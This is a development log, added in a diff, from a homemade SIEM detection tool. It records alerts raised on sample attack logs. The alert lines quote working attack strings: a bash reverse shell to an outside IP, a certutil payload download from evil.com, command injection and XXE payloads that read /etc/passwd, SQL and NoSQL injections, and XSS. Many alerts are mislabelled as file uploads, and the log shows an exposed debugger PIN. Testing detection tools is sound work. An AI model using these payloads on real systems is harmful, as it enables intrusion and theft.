@@ -1,0 +1,206 @@
+2025-12-23 03:41:34,033 - SIEM-Tool - INFO - Starting Simple SIEM Tool...
+2025-12-23 03:41:34,033 - SIEM-Tool - INFO - Loaded 7 detection rules
+2025-12-23 03:41:34,036 - SIEM-Tool - WARNING - ALERT ALERT-000001: File Upload Attempt - File upload attempted: malicious.php
+2025-12-23 03:41:34,036 - SIEM-Tool - WARNING - ALERT ALERT-000002: Port Scan Detection - Port scan detected from 203.0.113.10
+2025-12-23 03:41:34,036 - SIEM-Tool - WARNING - ALERT ALERT-000003: XSS Attempt - XSS attempt detected: <script>alert('xss')</script>
+2025-12-23 03:41:34,037 - SIEM-Tool - WARNING - ALERT ALERT-000004: Admin Access - Admin accessed sensitive configuration file
+2025-12-23 03:41:34,038 - SIEM-Tool - INFO - Generated 4 sample alerts
+2025-12-23 03:41:34,038 - SIEM-Tool - INFO - Server running on http://localhost:5000
+2025-12-23 03:41:34,980 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.1.5:5000
+2025-12-23 03:41:34,981 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-12-23 03:41:34,984 - werkzeug - INFO -  * Restarting with watchdog (windowsapi)
+2025-12-23 03:41:36,140 - SIEM-Tool - INFO - Starting Simple SIEM Tool...
+2025-12-23 03:41:36,140 - SIEM-Tool - INFO - Loaded 7 detection rules
+2025-12-23 03:41:36,145 - SIEM-Tool - WARNING - ALERT ALERT-000001: File Upload Attempt - File upload attempted: malicious.php
+2025-12-23 03:41:36,147 - SIEM-Tool - WARNING - ALERT ALERT-000002: Port Scan Detection - Port scan detected from 203.0.113.10
+2025-12-23 03:41:36,148 - SIEM-Tool - WARNING - ALERT ALERT-000003: XSS Attempt - XSS attempt detected: <script>alert('xss')</script>
+2025-12-23 03:41:36,149 - SIEM-Tool - WARNING - ALERT ALERT-000004: Admin Access - Admin accessed sensitive configuration file
+2025-12-23 03:41:36,150 - SIEM-Tool - INFO - Generated 4 sample alerts
+2025-12-23 03:41:36,150 - SIEM-Tool - INFO - Server running on http://localhost:5000
+2025-12-23 03:41:36,157 - werkzeug - WARNING -  * Debugger is active!
+2025-12-23 03:41:36,163 - werkzeug - INFO -  * Debugger PIN: 121-490-379
+2025-12-23 03:43:00,384 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:00] "GET / HTTP/1.1" 200 -
+2025-12-23 03:43:00,621 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:00] "GET /socket.io/?EIO=4&transport=polling&t=Pj8txgj HTTP/1.1" 200 -
+2025-12-23 03:43:00,849 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:00] "GET /alerts HTTP/1.1" 200 -
+2025-12-23 03:43:00,849 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:00] "GET /logs HTTP/1.1" 200 -
+2025-12-23 03:43:00,849 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:00] "GET /rules HTTP/1.1" 200 -
+2025-12-23 03:43:00,863 - SIEM-Tool - INFO - Client connected: 2NRt5aLo7sdDWZTEAAAB
+2025-12-23 03:43:00,866 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:00] "POST /socket.io/?EIO=4&transport=polling&t=Pj8txiW&sid=kg4LbNHzbKEsubUNAAAA HTTP/1.1" 200 -
+2025-12-23 03:43:00,947 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:00] "GET /socket.io/?EIO=4&transport=polling&t=Pj8txiZ&sid=kg4LbNHzbKEsubUNAAAA HTTP/1.1" 200 -
+2025-12-23 03:43:01,321 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:01] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2025-12-23 03:43:01,326 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:01] "GET /socket.io/?EIO=4&transport=polling&t=Pj8txo8&sid=kg4LbNHzbKEsubUNAAAA HTTP/1.1" 200 -
+2025-12-23 03:43:04,792 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:04] "GET /socket.io/?EIO=4&transport=websocket&sid=kg4LbNHzbKEsubUNAAAA HTTP/1.1" 200 -
+2025-12-23 03:43:05,123 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:05] "GET / HTTP/1.1" 200 -
+2025-12-23 03:43:05,158 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:05] "GET /socket.io/?EIO=4&transport=polling&t=Pj8typ1 HTTP/1.1" 200 -
+2025-12-23 03:43:05,369 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:05] "GET /alerts HTTP/1.1" 200 -
+2025-12-23 03:43:05,465 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:05] "GET /logs HTTP/1.1" 200 -
+2025-12-23 03:43:05,469 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:05] "GET /rules HTTP/1.1" 200 -
+2025-12-23 03:43:05,482 - SIEM-Tool - INFO - Client connected: t_AyE6zNkrlgx220AAAD
+2025-12-23 03:43:05,486 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:05] "POST /socket.io/?EIO=4&transport=polling&t=Pj8typD&sid=4MH262r73RlySJhhAAAC HTTP/1.1" 200 -
+2025-12-23 03:43:05,490 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:43:05] "GET /socket.io/?EIO=4&transport=polling&t=Pj8typE&sid=4MH262r73RlySJhhAAAC HTTP/1.1" 200 -
+2025-12-23 03:59:12,593 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 03:59:12] "GET /socket.io/?EIO=4&transport=websocket&sid=4MH262r73RlySJhhAAAC HTTP/1.1" 200 -
+2025-12-23 04:09:22,763 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:09:22] "GET /socket.io/?EIO=4&transport=polling&t=Pj8zzjq HTTP/1.1" 200 -
+2025-12-23 04:09:23,019 - SIEM-Tool - INFO - Client connected: 6VzKcgMuRo_Aw8k_AAAF
+2025-12-23 04:09:23,019 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:09:23] "POST /socket.io/?EIO=4&transport=polling&t=Pj8zzzK&sid=12AUu1TCP0eOmMt9AAAE HTTP/1.1" 200 -
+2025-12-23 04:09:23,082 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:09:23] "GET /socket.io/?EIO=4&transport=polling&t=Pj8zzzM&sid=12AUu1TCP0eOmMt9AAAE HTTP/1.1" 200 -
+2025-12-23 04:09:23,082 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:09:23] "GET /socket.io/?EIO=4&transport=polling&t=Pj8z-2H&sid=12AUu1TCP0eOmMt9AAAE HTTP/1.1" 200 -
+2025-12-23 04:12:39,384 - SIEM-Tool - WARNING - ALERT ALERT-000005: SQL Injection Attempt - 2023-12-10 14:12:35 ERROR SQL injection attempt detected: SELECT * FROM users WHERE id = ' OR '1'='1'
+2025-12-23 04:12:39,384 - SIEM-Tool - WARNING - ALERT ALERT-000006: File Upload Attempt - 2023-12-10 14:12:36 INFO File upload attempted: report.pdf
+2025-12-23 04:12:39,392 - SIEM-Tool - WARNING - ALERT ALERT-000007: Admin Access - 2023-12-10 14:12:37 SECURITY Admin accessed sensitive configuration file: /etc/config/system.conf
+2025-12-23 04:12:39,393 - SIEM-Tool - WARNING - ALERT ALERT-000008: XSS Attempt - 2023-12-10 14:12:38 ALERT XSS attempt detected in form input: <script>alert('hacked')</script>
+2025-12-23 04:12:39,396 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:12:39] "POST /analyze HTTP/1.1" 200 -
+2025-12-23 04:12:45,222 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:12:45] "GET /alerts HTTP/1.1" 200 -
+2025-12-23 04:12:45,527 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:12:45] "GET /logs HTTP/1.1" 200 -
+2025-12-23 04:16:58,928 - SIEM-Tool - WARNING - ALERT ALERT-000009: File Upload Attempt - 192.168.1.100 - - [10/Dec/2023:14:12:33 +0000] "GET /index.php?page=1 OR '1'='1 HTTP/1.1" 200 3421
+2025-12-23 04:16:58,936 - SIEM-Tool - WARNING - ALERT ALERT-000010: Admin Access - 192.168.1.101 - - [10/Dec/2023:14:12:34 +0000] "GET /admin/login.php HTTP/1.1" 200 1421
+2025-12-23 04:16:58,940 - SIEM-Tool - WARNING - ALERT ALERT-000011: File Upload Attempt - 192.168.1.101 - - [10/Dec/2023:14:12:34 +0000] "GET /admin/login.php HTTP/1.1" 200 1421
+2025-12-23 04:16:58,943 - SIEM-Tool - WARNING - ALERT ALERT-000012: File Upload Attempt - 192.168.1.100 - - [10/Dec/2023:14:12:35 +0000] "POST /login.php HTTP/1.1" 401 321
+2025-12-23 04:16:58,946 - SIEM-Tool - WARNING - ALERT ALERT-000013: XSS Attempt - 192.168.1.102 - - [10/Dec/2023:14:12:36 +0000] "GET /test.php?cmd=<script>alert('xss')</script> HTTP/1.1" 200 2543
+2025-12-23 04:16:58,951 - SIEM-Tool - WARNING - ALERT ALERT-000014: File Upload Attempt - 192.168.1.102 - - [10/Dec/2023:14:12:36 +0000] "GET /test.php?cmd=<script>alert('xss')</script> HTTP/1.1" 200 2543
+2025-12-23 04:16:58,954 - SIEM-Tool - WARNING - ALERT ALERT-000015: File Upload Attempt - 192.168.1.100 - - [10/Dec/2023:14:12:37 +0000] "POST /login.php HTTP/1.1" 401 321
+2025-12-23 04:16:58,959 - SIEM-Tool - WARNING - ALERT ALERT-000016: File Upload Attempt - 192.168.1.105 - - [10/Dec/2023:14:12:38 +0000] "GET /download.php?file=../../etc/passwd HTTP/1.1" 403 432
+2025-12-23 04:16:58,962 - SIEM-Tool - INFO - Analyzed file uploads\20251223_041658_log.txt: 14 logs, 8 alerts
+2025-12-23 04:16:58,965 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:16:58] "POST /upload HTTP/1.1" 200 -
+2025-12-23 04:16:59,186 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:16:59] "GET /alerts HTTP/1.1" 200 -
+2025-12-23 04:16:59,288 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:16:59] "GET /logs HTTP/1.1" 200 -
+2025-12-23 04:33:49,774 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:33:49] "GET /socket.io/?EIO=4&transport=websocket&sid=12AUu1TCP0eOmMt9AAAE HTTP/1.1" 200 -
+2025-12-23 04:33:50,112 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:33:50] "GET / HTTP/1.1" 200 -
+2025-12-23 04:33:50,154 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:33:50] "GET /socket.io/?EIO=4&transport=polling&t=Pj93aD7 HTTP/1.1" 200 -
+2025-12-23 04:33:50,347 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:33:50] "GET /alerts HTTP/1.1" 200 -
+2025-12-23 04:33:50,462 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:33:50] "GET /logs HTTP/1.1" 200 -
+2025-12-23 04:33:50,465 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:33:50] "GET /rules HTTP/1.1" 200 -
+2025-12-23 04:33:50,467 - SIEM-Tool - INFO - Client connected: 41kdllJJh4DCdbh-AAAH
+2025-12-23 04:33:50,468 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:33:50] "POST /socket.io/?EIO=4&transport=polling&t=Pj93aDG&sid=GWSiSePWDc6QfZb6AAAG HTTP/1.1" 200 -
+2025-12-23 04:33:50,473 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:33:50] "GET /socket.io/?EIO=4&transport=polling&t=Pj93aDH&sid=GWSiSePWDc6QfZb6AAAG HTTP/1.1" 200 -
+2025-12-23 04:34:29,576 - SIEM-Tool - INFO - Starting Simple SIEM Tool...
+2025-12-23 04:34:29,576 - SIEM-Tool - INFO - Loaded 42 detection rules
+2025-12-23 04:34:29,580 - SIEM-Tool - WARNING - ALERT ALERT-000001: File Upload Attempt - File upload attempted: malicious.php
+2025-12-23 04:34:29,580 - SIEM-Tool - WARNING - ALERT ALERT-000002: Web Shell Upload - File upload attempted: malicious.php
+2025-12-23 04:34:29,590 - SIEM-Tool - WARNING - ALERT ALERT-000003: Port Scan Detection - Port scan detected from 203.0.113.10
+2025-12-23 04:34:29,592 - SIEM-Tool - WARNING - ALERT ALERT-000004: XSS Attempt - XSS attempt detected: <script>alert('xss')</script>
+2025-12-23 04:34:29,592 - SIEM-Tool - WARNING - ALERT ALERT-000005: Admin Access - Admin accessed sensitive configuration file
+2025-12-23 04:34:29,596 - SIEM-Tool - INFO - Generated 5 sample alerts
+2025-12-23 04:34:29,596 - SIEM-Tool - INFO - Server running on http://localhost:5000
+2025-12-23 04:34:30,473 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.1.5:5000
+2025-12-23 04:34:30,474 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-12-23 04:34:30,476 - werkzeug - INFO -  * Restarting with watchdog (windowsapi)
+2025-12-23 04:34:31,647 - SIEM-Tool - INFO - Starting Simple SIEM Tool...
+2025-12-23 04:34:31,649 - SIEM-Tool - INFO - Loaded 42 detection rules
+2025-12-23 04:34:31,657 - SIEM-Tool - WARNING - ALERT ALERT-000001: File Upload Attempt - File upload attempted: malicious.php
+2025-12-23 04:34:31,657 - SIEM-Tool - WARNING - ALERT ALERT-000002: Web Shell Upload - File upload attempted: malicious.php
+2025-12-23 04:34:31,660 - SIEM-Tool - WARNING - ALERT ALERT-000003: Port Scan Detection - Port scan detected from 203.0.113.10
+2025-12-23 04:34:31,661 - SIEM-Tool - WARNING - ALERT ALERT-000004: XSS Attempt - XSS attempt detected: <script>alert('xss')</script>
+2025-12-23 04:34:31,661 - SIEM-Tool - WARNING - ALERT ALERT-000005: Admin Access - Admin accessed sensitive configuration file
+2025-12-23 04:34:31,662 - SIEM-Tool - INFO - Generated 5 sample alerts
+2025-12-23 04:34:31,663 - SIEM-Tool - INFO - Server running on http://localhost:5000
+2025-12-23 04:34:31,667 - werkzeug - WARNING -  * Debugger is active!
+2025-12-23 04:34:31,674 - werkzeug - INFO -  * Debugger PIN: 121-490-379
+2025-12-23 04:34:32,646 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:32] "GET /socket.io/?EIO=4&transport=polling&t=Pj93kVx HTTP/1.1" 200 -
+2025-12-23 04:34:32,889 - SIEM-Tool - INFO - Client connected: 5OD9Zpyarx9_WwR6AAAB
+2025-12-23 04:34:32,892 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:32] "POST /socket.io/?EIO=4&transport=polling&t=Pj93kbE&sid=7faFqTbS6t-XbGIMAAAA HTTP/1.1" 200 -
+2025-12-23 04:34:32,979 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:32] "GET /socket.io/?EIO=4&transport=polling&t=Pj93kbG&sid=7faFqTbS6t-XbGIMAAAA HTTP/1.1" 200 -
+2025-12-23 04:34:32,991 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:32] "GET /socket.io/?EIO=4&transport=polling&t=Pj93kgS&sid=7faFqTbS6t-XbGIMAAAA HTTP/1.1" 200 -
+2025-12-23 04:34:33,367 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:33] "GET /socket.io/?EIO=4&transport=polling&t=Pj93khL&sid=7faFqTbS6t-XbGIMAAAA HTTP/1.1" 200 -
+2025-12-23 04:34:53,979 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:53] "GET / HTTP/1.1" 200 -
+2025-12-23 04:34:54,127 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:54] "GET /socket.io/?EIO=4&transport=polling&t=Pj93pqg HTTP/1.1" 200 -
+2025-12-23 04:34:54,131 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:54] "GET /alerts HTTP/1.1" 200 -
+2025-12-23 04:34:54,133 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:54] "GET /logs HTTP/1.1" 200 -
+2025-12-23 04:34:54,140 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:54] "GET /rules HTTP/1.1" 200 -
+2025-12-23 04:34:54,152 - SIEM-Tool - INFO - Client connected: uSt0sTh9QiW0csiLAAAD
+2025-12-23 04:34:54,154 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:54] "POST /socket.io/?EIO=4&transport=polling&t=Pj93pr0&sid=m6WnU7zJyieuLYKpAAAC HTTP/1.1" 200 -
+2025-12-23 04:34:54,161 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:54] "GET /socket.io/?EIO=4&transport=polling&t=Pj93pr4&sid=m6WnU7zJyieuLYKpAAAC HTTP/1.1" 200 -
+2025-12-23 04:34:54,183 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:54] "GET /socket.io/?EIO=4&transport=polling&t=Pj93pra&sid=m6WnU7zJyieuLYKpAAAC HTTP/1.1" 200 -
+2025-12-23 04:34:54,186 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:54] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2025-12-23 04:34:56,067 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:34:56] "GET /socket.io/?EIO=4&transport=websocket&sid=7faFqTbS6t-XbGIMAAAA HTTP/1.1" 200 -
+2025-12-23 04:35:39,569 - SIEM-Tool - WARNING - ALERT ALERT-000006: ARP Spoofing - 2023-12-10 14:12:35 ARP spoofing attempt detected from MAC 00:11:22:33:44:55
+2025-12-23 04:35:39,570 - SIEM-Tool - WARNING - ALERT ALERT-000007: DNS Tunneling - 2023-12-10 14:12:40 DNS tunneling detected: long.domain.name.base64.encoded.data.evil.com
+2025-12-23 04:35:39,578 - SIEM-Tool - WARNING - ALERT ALERT-000008: VLAN Hopping - 2023-12-10 14:12:50 VLAN hopping attempt detected on switch port 24
+2025-12-23 04:35:39,583 - SIEM-Tool - WARNING - ALERT ALERT-000009: MAC Address Spoofing - 2023-12-10 14:12:55 MAC address spoofing: 00:11:22:33:44:55 changed to AA:BB:CC:DD:EE:FF
+2025-12-23 04:35:39,588 - SIEM-Tool - WARNING - ALERT ALERT-000010: Packet Fragmentation Attack - 2023-12-10 14:13:00 Packet fragmentation attack: IP fragment overlap detected
+2025-12-23 04:35:39,589 - SIEM-Tool - WARNING - ALERT ALERT-000011: DHCP Starvation - 2023-12-10 14:13:05 DHCP starvation attack - all addresses exhausted
+2025-12-23 04:35:39,591 - SIEM-Tool - WARNING - ALERT ALERT-000012: DNS Amplification - 2023-12-10 14:13:10 DNS amplification attack from 198.51.100.30
+2025-12-23 04:35:39,592 - SIEM-Tool - WARNING - ALERT ALERT-000013: Tor Connection - 2023-12-10 14:13:15 Tor connection established to 185.220.101.40:9050
+2025-12-23 04:35:39,594 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:35:39] "POST /analyze HTTP/1.1" 200 -
+2025-12-23 04:35:43,827 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:35:43] "GET /alerts HTTP/1.1" 200 -
+2025-12-23 04:35:43,838 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:35:43] "GET /logs HTTP/1.1" 200 -
+2025-12-23 04:37:05,900 - SIEM-Tool - WARNING - ALERT ALERT-000014: File Upload Attempt - GET /index.php?page=../../../etc/passwd HTTP/1.1 - Directory traversal attempt
+2025-12-23 04:37:05,901 - SIEM-Tool - WARNING - ALERT ALERT-000015: Directory Traversal - GET /index.php?page=../../../etc/passwd HTTP/1.1 - Directory traversal attempt
+2025-12-23 04:37:05,907 - SIEM-Tool - WARNING - ALERT ALERT-000016: LFI/RFI Attack - GET /index.php?page=../../../etc/passwd HTTP/1.1 - Directory traversal attempt
+2025-12-23 04:37:05,910 - SIEM-Tool - WARNING - ALERT ALERT-000017: XSS Attempt - POST /search.php?query={$where: "javascript:alert(1)"} - NoSQL injection detected
+2025-12-23 04:37:05,912 - SIEM-Tool - WARNING - ALERT ALERT-000018: File Upload Attempt - POST /search.php?query={$where: "javascript:alert(1)"} - NoSQL injection detected
+2025-12-23 04:37:05,913 - SIEM-Tool - WARNING - ALERT ALERT-000019: NoSQL Injection - POST /search.php?query={$where: "javascript:alert(1)"} - NoSQL injection detected
+2025-12-23 04:37:05,920 - SIEM-Tool - WARNING - ALERT ALERT-000020: File Upload Attempt - GET /api.php?url=http://localhost/admin - SSRF attempt
+2025-12-23 04:37:05,921 - SIEM-Tool - WARNING - ALERT ALERT-000021: SSRF Attack - GET /api.php?url=http://localhost/admin - SSRF attempt
+2025-12-23 04:37:05,922 - SIEM-Tool - WARNING - ALERT ALERT-000022: Directory Traversal - GET /download?file=../../windows/win.ini - Path traversal
+2025-12-23 04:37:05,923 - SIEM-Tool - WARNING - ALERT ALERT-000023: File Upload Attempt - POST /submit.php?cmd=;cat /etc/passwd - Command injection
+2025-12-23 04:37:05,924 - SIEM-Tool - WARNING - ALERT ALERT-000024: Directory Traversal - POST /submit.php?cmd=;cat /etc/passwd - Command injection
+2025-12-23 04:37:05,926 - SIEM-Tool - WARNING - ALERT ALERT-000025: File Upload Attempt - GET /xml.php?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> - XXE attack
+2025-12-23 04:37:05,930 - SIEM-Tool - WARNING - ALERT ALERT-000026: Directory Traversal - GET /xml.php?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> - XXE attack
+2025-12-23 04:37:05,931 - SIEM-Tool - WARNING - ALERT ALERT-000027: XXE Injection - GET /xml.php?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> - XXE attack
+2025-12-23 04:37:05,933 - SIEM-Tool - WARNING - ALERT ALERT-000028: OWASP Top 10 Detection - GET /xml.php?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> - XXE attack
+2025-12-23 04:37:05,934 - SIEM-Tool - WARNING - ALERT ALERT-000029: File Upload Attempt - GET /redirect.php?url=http://evil.com/phishing - Open redirect
+2025-12-23 04:37:05,935 - SIEM-Tool - WARNING - ALERT ALERT-000030: Open Redirect - GET /redirect.php?url=http://evil.com/phishing - Open redirect
+2025-12-23 04:37:05,936 - SIEM-Tool - WARNING - ALERT ALERT-000031: File Upload Attempt - POST /login.php - CSRF token missing, potential attack
+2025-12-23 04:37:05,936 - SIEM-Tool - WARNING - ALERT ALERT-000032: CSRF Attack Pattern - POST /login.php - CSRF token missing, potential attack
+2025-12-23 04:37:05,937 - SIEM-Tool - WARNING - ALERT ALERT-000033: File Upload Attempt - GET /admin.php - WAF bypass attempt using encoding
+2025-12-23 04:37:05,939 - SIEM-Tool - WARNING - ALERT ALERT-000034: File Upload Attempt - POST /upload.php - File upload attempted: shell.php
+2025-12-23 04:37:05,940 - SIEM-Tool - WARNING - ALERT ALERT-000035: OWASP Top 10 Detection - GET /api/users - Broken access control - unauthorized access
+2025-12-23 04:37:05,946 - SIEM-Tool - WARNING - ALERT ALERT-000036: Crypto Mining - 2023-12-10 14:12:35 Crypto mining process detected: xmrig running on high CPU
+2025-12-23 04:37:05,948 - SIEM-Tool - WARNING - ALERT ALERT-000037: Reverse Shell - 2023-12-10 14:12:40 Reverse shell connection: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
+2025-12-23 04:37:05,949 - SIEM-Tool - WARNING - ALERT ALERT-000038: File Upload Attempt - 2023-12-10 14:12:45 Web shell uploaded: /uploads/c99shell.php detected
+2025-12-23 04:37:05,950 - SIEM-Tool - WARNING - ALERT ALERT-000039: Web Shell Upload - 2023-12-10 14:12:45 Web shell uploaded: /uploads/c99shell.php detected
+2025-12-23 04:37:05,951 - SIEM-Tool - WARNING - ALERT ALERT-000040: Keylogger Activity - 2023-12-10 14:12:50 Keylogger activity: keystroke logging process running
+2025-12-23 04:37:05,952 - SIEM-Tool - WARNING - ALERT ALERT-000041: Botnet Communication - 2023-12-10 14:12:55 Botnet communication to C&C server 94.130.11.15
+2025-12-23 04:37:05,953 - SIEM-Tool - WARNING - ALERT ALERT-000042: Worm Propagation - 2023-12-10 14:13:00 Worm propagation detected: mass scanning from 192.168.1.200
+2025-12-23 04:37:05,954 - SIEM-Tool - WARNING - ALERT ALERT-000043: File Upload Attempt - 2023-12-10 14:13:05 Trojan downloader executed: malware.exe downloaded and executed
+2025-12-23 04:37:05,955 - SIEM-Tool - WARNING - ALERT ALERT-000044: Trojan Downloader - 2023-12-10 14:13:05 Trojan downloader executed: malware.exe downloaded and executed
+2025-12-23 04:37:05,956 - SIEM-Tool - WARNING - ALERT ALERT-000045: Spyware Data Exfil - 2023-12-10 14:13:10 Spyware screenshot capture uploaded to external server
+2025-12-23 04:37:05,958 - SIEM-Tool - WARNING - ALERT ALERT-000046: Malicious PowerShell - 2023-12-10 14:13:15 Malicious PowerShell command: powershell -enc SQBFAFgAIAAkAHcAYwA=
+2025-12-23 04:37:05,959 - SIEM-Tool - WARNING - ALERT ALERT-000047: File Upload Attempt - 2023-12-10 14:13:20 Living Off The Land: certutil -urlcache -split -f http://evil.com/file.exe
+2025-12-23 04:37:05,964 - SIEM-Tool - WARNING - ALERT ALERT-000048: Living Off The Land - 2023-12-10 14:13:20 Living Off The Land: certutil -urlcache -split -f http://evil.com/file.exe
+2025-12-23 04:37:05,966 - SIEM-Tool - WARNING - ALERT ALERT-000049: File Upload Attempt - 2023-12-10 14:13:25 Credential dumping: mimikatz.exe detected in memory
+2025-12-23 04:37:05,967 - SIEM-Tool - WARNING - ALERT ALERT-000050: Credential Dumping - 2023-12-10 14:13:25 Credential dumping: mimikatz.exe detected in memory
+2025-12-23 04:37:05,968 - SIEM-Tool - WARNING - ALERT ALERT-000051: Persistence Mechanism - 2023-12-10 14:13:30 Persistence mechanism: malware added to registry run key
+2025-12-23 04:37:05,969 - SIEM-Tool - WARNING - ALERT ALERT-000052: SQL Injection Attempt - 2023-12-10 14:12:33 SQL Injection: SELECT * FROM users WHERE id = ' OR '1'='1
+2025-12-23 04:37:05,971 - SIEM-Tool - WARNING - ALERT ALERT-000053: NoSQL Injection - 2023-12-10 14:12:35 NoSQL Injection: db.users.find({$where: "this.username == 'admin'"})
+2025-12-23 04:37:05,972 - SIEM-Tool - WARNING - ALERT ALERT-000054: SQL Injection Attempt - 2023-12-10 14:12:40 Database enumeration: SELECT * FROM information_schema.tables
+2025-12-23 04:37:05,974 - SIEM-Tool - WARNING - ALERT ALERT-000055: OWASP Top 10 Detection - 2023-12-10 14:12:45 Sensitive data exposure: credit_card table accessed without authorization
+2025-12-23 04:37:05,976 - SIEM-Tool - WARNING - ALERT ALERT-000056: NoSQL Injection - 2023-12-10 14:12:55 MongoDB injection: {"username": {"$ne": null}, "password": {"$ne": null}}
+2025-12-23 04:37:05,979 - SIEM-Tool - INFO - Analyzed file uploads\20251223_043705_mixedlogs.txt: 30 logs, 43 alerts
+2025-12-23 04:37:05,981 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:37:05] "POST /upload HTTP/1.1" 200 -
+2025-12-23 04:37:06,002 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:37:06] "GET /alerts HTTP/1.1" 200 -
+2025-12-23 04:37:06,004 - werkzeug - INFO - 127.0.0.1 - - [23/Dec/2025 04:37:06] "GET /logs HTTP/1.1" 200 -
+2025-12-25 15:08:30,805 - SIEM-Tool - INFO - TIP model unavailable (missing dependencies): No module named 'tensorflow.python'
+2025-12-25 15:08:30,813 - SIEM-Tool - INFO - Starting Simple SIEM Tool...
+2025-12-25 15:08:30,813 - SIEM-Tool - INFO - Loaded 42 detection rules
+2025-12-25 15:08:30,819 - SIEM-Tool - WARNING - ALERT ALERT-000001: File Upload Attempt - File upload attempted: malicious.php
+2025-12-25 15:08:30,820 - SIEM-Tool - WARNING - ALERT ALERT-000002: Web Shell Upload - File upload attempted: malicious.php
+2025-12-25 15:08:30,820 - SIEM-Tool - WARNING - ALERT ALERT-000003: Port Scan Detection - Port scan detected from 203.0.113.10
+2025-12-25 15:08:30,821 - SIEM-Tool - WARNING - ALERT ALERT-000004: XSS Attempt - XSS attempt detected: <script>alert('xss')</script>
+2025-12-25 15:08:30,821 - SIEM-Tool - WARNING - ALERT ALERT-000005: Admin Access - Admin accessed sensitive configuration file
+2025-12-25 15:08:30,822 - SIEM-Tool - INFO - Generated 5 sample alerts
+2025-12-25 15:08:30,822 - SIEM-Tool - INFO - Server running on http://localhost:5000
+2025-12-25 15:08:30,931 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.1.2:5000
+2025-12-25 15:08:30,931 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-12-25 15:08:30,931 - werkzeug - INFO -  * Restarting with stat
